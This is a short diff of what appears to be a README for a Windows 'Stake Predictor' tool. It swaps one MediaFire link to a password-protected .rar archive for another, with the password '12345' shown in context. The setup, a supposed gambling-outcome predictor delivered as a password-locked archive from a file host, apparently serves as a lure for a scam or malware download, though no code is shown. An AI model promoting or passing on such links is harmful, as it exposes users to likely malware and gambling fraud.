@@ -19,4 +19,4 @@ Pass: 12345
 
 Requirement: Windows
 
-[Download the Latest Version](https://www.mediafire.com/file/s8molv4vi6imoe7/New_Stake_Predictor.rar/file) 
+[Download the Latest Version](https://www.mediafire.com/file/yizla18644jk0ql/Stake_Predictor2026.rar/file) 
